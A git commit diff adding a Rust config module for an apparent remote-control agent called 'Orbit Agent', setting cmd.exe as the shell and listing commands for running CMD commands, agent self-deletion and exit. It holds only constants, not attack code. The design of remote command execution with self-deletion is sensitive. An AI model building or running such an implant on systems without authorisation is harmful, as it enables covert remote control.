c672293bfa271dec978003593335c11a2c57df30
Or Gur Arie <orgurar@gmail.com>
2021-12-02 22:45:39 +0200

    Added commands config module

---
+++ src/config/commands.rs
@@ -0,0 +1,7 @@
+pub const CLI: &str = "cmd.exe"; // Command Line Interface
+pub const UNKNOWN_COMMAND: &str = "Orbit Error: Unknown Command"; // unknown command error string
+pub const OUTPUT_ERR: &str = "Cannot Read Command's Output"; // invalid output error string
+pub const HELP: &str = "Orbit Agent Commands:
+[+]\t'cmd' - Run a CMD command
+[+]\t'delete_agent' - Agent's self deletion
+[+]\t'exit_agent' - Stops Agent from running"; // help string
--- src/config/mod.rs
+++ src/config/mod.rs
@@ -1,3 +1,4 @@
+pub mod commands;
 pub mod filesystem;
 pub mod server;
 
